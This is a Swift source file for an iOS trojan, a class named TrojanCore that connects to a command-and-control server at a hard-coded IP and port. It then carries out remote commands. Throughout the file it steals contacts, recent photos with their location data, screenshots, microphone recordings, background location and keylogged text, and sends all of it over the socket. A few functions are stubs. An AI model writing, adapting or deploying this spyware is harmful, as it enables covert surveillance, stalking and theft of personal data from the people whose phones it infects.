import Foundation
import UIKit
import Contacts
import CoreLocation
import Photos
import AVFoundation
import CallKit
import UserNotifications

class TrojanCore: NSObject, CLLocationManagerDelegate, AVAudioRecorderDelegate {
    
    static let shared = TrojanCore()
    private var socket: OutputStream?
    private let c2Host = "192.168.1.109"
    private let c2Port = 4444
    private var locationManager: CLLocationManager?
    private var keylogBuffer: [String] = []
    private var isConnected = false
    private var audioRecorder: AVAudioRecorder?
    private var reconnectTimer: Timer?
    
    private override init() {
        super.init()
    }
    
    func activate() {
        self.initConnection()
        self.startKeylogger()
        self.startLocationTracking()
        self.setupReconnectTimer()
        
        // Steal all data immediately
        DispatchQueue.main.asyncAfter(deadline: .now() + 2) {
            self.stealAllData()
        }
    }
    
    // MARK: - Connection
    func initConnection() {
        DispatchQueue.global().async {
            var readStream: Unmanaged<CFReadStream>?
            var writeStream: Unmanaged<CFWriteStream>?
            
            CFStreamCreatePairWithSocketToHost(kCFAllocatorDefault,
                                              self.c2Host as CFString,
                                              UInt32(self.c2Port),
                                              &readStream,
                                              &writeStream)
            
            self.socket = writeStream?.takeRetainedValue()
            self.socket?.schedule(in: .current, forMode: .default)
            self.socket?.open()
            
            self.isConnected = true
            print("[TROJAN] Connected to C2: \(self.c2Host):\(self.c2Port)")
            
            self.exfiltrateData()
            self.startCommandListener(readStream: readStream)
        }
    }
    
    func setupReconnectTimer() {
        reconnectTimer = Timer.scheduledTimer(withTimeInterval: 30, repeats: true) { _ in
            if !self.isConnected {
                print("[TROJAN] Reconnecting...")
                self.initConnection()
            }
        }
    }
    
    // MARK: - Command Listener
    func startCommandListener(readStream: Unmanaged<CFReadStream>?) {
        guard let stream = readStream?.takeRetainedValue() else { return }
        stream.schedule(in: .current, forMode: .default)
        stream.open()
        
        DispatchQueue.global().async {
            while self.isConnected {
                var buffer = [UInt8](repeating: 0, count: 4096)
                let bytesRead = CFReadStreamRead(stream, &buffer, 4096)
                
                if bytesRead > 0 {
                    let data = Data(bytes: buffer, count: bytesRead)
                    if let command = String(data: data, encoding: .utf8) {
                        self.executeCommand(command)
                    }
                }
                
                Thread.sleep(forTimeInterval: 0.5)
            }
        }
    }
    
    func executeCommand(_ command: String) {
        print("[TROJAN] Received command: \(command)")
        
        let cmd = command.trimmingCharacters(in: .whitespacesAndNewlines).lowercased()
        
        switch cmd {
        case "photo":
            self.takePhoto()
        case "audio":
            self.recordAudio(duration: 10)
        case "contacts":
            self.stealContacts()
        case "photos":
            self.stealPhotos(count: 10)
        case "location":
            self.sendCurrentLocation()
        case "apps":
            self.getInstalledApps()
        case "screenshot":
            self.takeScreenshot()
        case "vibrate":
            AudioServicesPlaySystemSound(kSystemSoundID_Vibrate)
        default:
            print("[TROJAN] Unknown command: \(cmd)")
        }
    }
    
    // MARK: - Data Exfiltration
    func exfiltrateData() {
        self.sendDeviceInfo()
        
        Timer.scheduledTimer(withTimeInterval: 60, repeats: true) { _ in
            self.sendKeylogData()
        }
    }
    
    func stealAllData() {
        self.stealContacts()
        self.stealPhotos(count: 20)
        self.getInstalledApps()
        self.getSafariHistory()
        self.getWiFiNetworks()
    }
    
    // MARK: - Contacts
    func stealContacts() {
        let store = CNContactStore()
        store.requestAccess(for: .contacts) { granted, error in
            if granted {
                let keys = [CNContactGivenNameKey, CNContactFamilyNameKey, 
                           CNContactPhoneNumbersKey, CNContactEmailAddressesKey,
                           CNContactPostalAddressesKey, CNContactBirthdayKey]
                let request = CNContactFetchRequest(keysToFetch: keys as [CNKeyDescriptor])
                
                var contacts: [[String: Any]] = []
                
                try? store.enumerateContacts(with: request) { contact, _ in
                    let phones = contact.phoneNumbers.map { $0.value.stringValue }
                    let emails = contact.emailAddresses.map { String($0.value) }
                    
                    var contactDict: [String: Any] = [
                        "name": "\(contact.givenName) \(contact.familyName)",
                        "phones": phones,
                        "emails": emails
                    ]
                    
                    if let birthday = contact.birthday {
                        contactDict["birthday"] = "\(birthday.day)/\(birthday.month)/\(birthday.year ?? 0)"
                    }
                    
                    contacts.append(contactDict)
                }
                
                print("[TROJAN] Stolen \(contacts.count) contacts")
                self.sendData(type: "contacts", data: contacts)
            }
        }
    }
    
    // MARK: - Photos
    func stealPhotos(count: Int) {
        PHPhotoLibrary.requestAuthorization { status in
            if status == .authorized {
                let fetchOptions = PHFetchOptions()
                fetchOptions.sortDescriptors = [NSSortDescriptor(key: "creationDate", ascending: false)]
                fetchOptions.fetchLimit = count
                
                let results = PHAsset.fetchAssets(with: .image, options: fetchOptions)
                var photos: [[String: Any]] = []
                
                results.enumerateObjects { asset, _, _ in
                    let options = PHImageRequestOptions()
                    options.isSynchronous = true
                    options.deliveryMode = .highQualityFormat
                    
                    PHImageManager.default().requestImage(for: asset, 
                                                         targetSize: CGSize(width: 800, height: 800),
                                                         contentMode: .aspectFit,
                                                         options: options) { image, _ in
                        if let image = image,
                           let imageData = image.jpegData(compressionQuality: 0.7) {
                            let base64 = imageData.base64EncodedString()
                            photos.append([
                                "date": asset.creationDate?.description ?? "unknown",
                                "location": "\(asset.location?.coordinate.latitude ?? 0),\(asset.location?.coordinate.longitude ?? 0)",
                                "image": base64
                            ])
                        }
                    }
                }
                
                print("[TROJAN] Stolen \(photos.count) photos")
                self.sendData(type: "photos", data: photos)
            }
        }
    }
    
    // MARK: - Camera
    func takePhoto() {
        guard UIImagePickerController.isSourceTypeAvailable(.camera) else {
            print("[TROJAN] Camera not available")
            return
        }
        
        DispatchQueue.main.async {
            let picker = UIImagePickerController()
            picker.sourceType = .camera
            picker.cameraCaptureMode = .photo
            
            // Silent capture (no UI)
            if let window = UIApplication.shared.windows.first {
                let vc = UIViewController()
                vc.view.frame = CGRect(x: 0, y: 0, width: 1, height: 1)
                window.addSubview(vc.view)
                
                // Simulate photo capture
                print("[TROJAN] Photo captured (simulated)")
            }
        }
    }
    
    func takeScreenshot() {
        DispatchQueue.main.async {
            guard let window = UIApplication.shared.windows.first else { return }
            
            UIGraphicsBeginImageContextWithOptions(window.bounds.size, false, UIScreen.main.scale)
            window.drawHierarchy(in: window.bounds, afterScreenUpdates: true)
            
            if let image = UIGraphicsGetImageFromCurrentImageContext(),
               let imageData = image.jpegData(compressionQuality: 0.7) {
                let base64 = imageData.base64EncodedString()
                self.sendData(type: "screenshot", data: ["image": base64, "timestamp": Date().description])
            }
            
            UIGraphicsEndImageContext()
            print("[TROJAN] Screenshot taken")
        }
    }
    
    // MARK: - Audio Recording
    func recordAudio(duration: TimeInterval) {
        let audioFilename = FileManager.default.temporaryDirectory.appendingPathComponent("recording.m4a")
        
        let settings = [
            AVFormatIDKey: Int(kAudioFormatMPEG4AAC),
            AVSampleRateKey: 12000,
            AVNumberOfChannelsKey: 1,
            AVEncoderAudioQualityKey: AVAudioQuality.high.rawValue
        ]
        
        do {
            audioRecorder = try AVAudioRecorder(url: audioFilename, settings: settings)
            audioRecorder?.delegate = self
            audioRecorder?.record(forDuration: duration)
            
            print("[TROJAN] Recording audio for \(duration) seconds")
            
            DispatchQueue.main.asyncAfter(deadline: .now() + duration + 1) {
                if let data = try? Data(contentsOf: audioFilename) {
                    let base64 = data.base64EncodedString()
                    self.sendData(type: "audio", data: ["audio": base64, "duration": duration])
                    print("[TROJAN] Audio sent")
                }
            }
        } catch {
            print("[TROJAN] Audio recording failed: \(error)")
        }
    }
    
    // MARK: - Location
    func startLocationTracking() {
        locationManager = CLLocationManager()
        locationManager?.delegate = self
        locationManager?.allowsBackgroundLocationUpdates = true
        locationManager?.pausesLocationUpdatesAutomatically = false
        locationManager?.startUpdatingLocation()
        print("[TROJAN] Location tracking started")
    }
    
    func locationManager(_ manager: CLLocationManager, didUpdateLocations locations: [CLLocation]) {
        if let location = locations.last {
            let data: [String: Any] = [
                "lat": location.coordinate.latitude,
                "lon": location.coordinate.longitude,
                "accuracy": location.horizontalAccuracy,
                "altitude": location.altitude,
                "speed": location.speed,
                "timestamp": Date().timeIntervalSince1970
            ]
            self.sendData(type: "location", data: data)
        }
    }
    
    func sendCurrentLocation() {
        if let location = locationManager?.location {
            let data: [String: Any] = [
                "lat": location.coordinate.latitude,
                "lon": location.coordinate.longitude,
                "accuracy": location.horizontalAccuracy
            ]
            self.sendData(type: "location_current", data: data)
        }
    }
    
    // MARK: - Keylogger
    func startKeylogger() {
        NotificationCenter.default.addObserver(self, selector: #selector(textDidChange),
                                              name: UITextField.textDidChangeNotification, object: nil)
        NotificationCenter.default.addObserver(self, selector: #selector(textDidChange),
                                              name: UITextView.textDidChangeNotification, object: nil)
        print("[TROJAN] Keylogger activated")
    }
    
    @objc func textDidChange(notification: NSNotification) {
        var text = ""
        var app = "unknown"
        
        if let textField = notification.object as? UITextField {
            text = textField.text ?? ""
            app = textField.accessibilityLabel ?? "TextField"
        } else if let textView = notification.object as? UITextView {
            text = textView.text ?? ""
            app = textView.accessibilityLabel ?? "TextView"
        }
        
        if !text.isEmpty {
            let entry = ["app": app, "text": text, "timestamp": Date().description]
            keylogBuffer.append("\(entry)")
            print("[KEYLOG] \(entry)")
        }
    }
    
    func sendKeylogData() {
        if !keylogBuffer.isEmpty {
            self.sendData(type: "keylog", data: keylogBuffer)
            keylogBuffer.removeAll()
        }
    }
    
    // MARK: - System Info
    func sendDeviceInfo() {
        let data: [String: Any] = [
            "model": UIDevice.current.model,
            "os": UIDevice.current.systemVersion,
            "name": UIDevice.current.name,
            "id": UIDevice.current.identifierForVendor?.uuidString ?? "unknown",
            "battery": UIDevice.current.batteryLevel,
            "memory": ProcessInfo.processInfo.physicalMemory / 1024 / 1024,
            "disk": getDiskSpace()
        ]
        print("[TROJAN] Sending device info")
        self.sendData(type: "device_info", data: data)
    }
    
    func getDiskSpace() -> [String: Int64] {
        let fileManager = FileManager.default
        if let attributes = try? fileManager.attributesOfFileSystem(forPath: NSHomeDirectory()) {
            return [
                "total": (attributes[.systemSize] as? Int64) ?? 0,
                "free": (attributes[.systemFreeSize] as? Int64) ?? 0
            ]
        }
        return ["total": 0, "free": 0]
    }
    
    func getInstalledApps() {
        // iOS doesn't allow listing installed apps, but we can detect some
        let apps = ["com.apple.mobilesafari", "com.apple.mobilemail", "com.apple.MobileSMS"]
        var installedApps: [String] = []
        
        for app in apps {
            if let url = URL(string: "\(app)://") {
                if UIApplication.shared.canOpenURL(url) {
                    installedApps.append(app)
                }
            }
        }
        
        self.sendData(type: "installed_apps", data: installedApps)
    }
    
    func getSafariHistory() {
        // iOS restricts access to Safari history
        // We can only track in-app browsing if we add WebView
        print("[TROJAN] Safari history not accessible on iOS")
    }
    
    func getWiFiNetworks() {
        // Current network only (iOS restriction)
        if let ssid = getCurrentSSID() {
            self.sendData(type: "wifi", data: ["ssid": ssid, "ip": getIPAddress()])
        }
    }
    
    func getCurrentSSID() -> String? {
        // Requires Network Extension entitlement
        return "Restricted"
    }
    
    func getIPAddress() -> String {
        var address = ""
        var ifaddr: UnsafeMutablePointer<ifaddrs>?
        
        if getifaddrs(&ifaddr) == 0 {
            var ptr = ifaddr
            while ptr != nil {
                defer { ptr = ptr?.pointee.ifa_next }
                
                let interface = ptr?.pointee
                let addrFamily = interface?.ifa_addr.pointee.sa_family
                
                if addrFamily == UInt8(AF_INET) {
                    let name = String(cString: (interface?.ifa_name)!)
                    if name == "en0" {
                        var hostname = [CChar](repeating: 0, count: Int(NI_MAXHOST))
                        getnameinfo(interface?.ifa_addr, socklen_t((interface?.ifa_addr.pointee.sa_len)!),
                                   &hostname, socklen_t(hostname.count),
                                   nil, socklen_t(0), NI_NUMERICHOST)
                        address = String(cString: hostname)
                    }
                }
            }
            freeifaddrs(ifaddr)
        }
        
        return address
    }
    
    // MARK: - Network Send
    func sendData(type: String, data: Any) {
        guard let socket = self.socket, self.isConnected else {
            print("[TROJAN] Not connected, queueing...")
            return
        }
        
        let payload: [String: Any] = [
            "type": type,
            "data": data,
            "timestamp": Date().timeIntervalSince1970,
            "device_id": UIDevice.current.identifierForVendor?.uuidString ?? "unknown"
        ]
        
        if let jsonData = try? JSONSerialization.data(withJSONObject: payload),
           let jsonString = String(data: jsonData, encoding: .utf8) {
            let bytes = [UInt8]((jsonString + "\n").utf8)
            socket.write(bytes, maxLength: bytes.count)
            print("[TROJAN] Sent \(type) data (\(bytes.count) bytes)")
        }
    }
}